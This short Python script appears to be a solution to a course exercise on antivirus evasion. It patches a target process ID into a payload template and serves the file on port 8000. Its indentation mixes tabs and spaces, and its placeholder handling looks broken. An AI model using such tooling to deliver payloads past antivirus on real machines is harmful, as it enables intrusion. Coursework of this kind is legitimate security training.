import server
import struct


class SolutionServer(server.EvadeAntivirusServer):

    def get_payload(self, pid):
    	with open("q2.template") as f:
    		s = f.read()
        with open("q2.template",'w') as f:
        	replace_str = struct.pack('<I',0x12345678)
        	s = s.replace(replace_str,str(pid))
        	f.write(s)
        return "./q2.template"

    def print_handler(self, payload, product):
        print(product)

    def evade_antivirus(self, pid):
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)

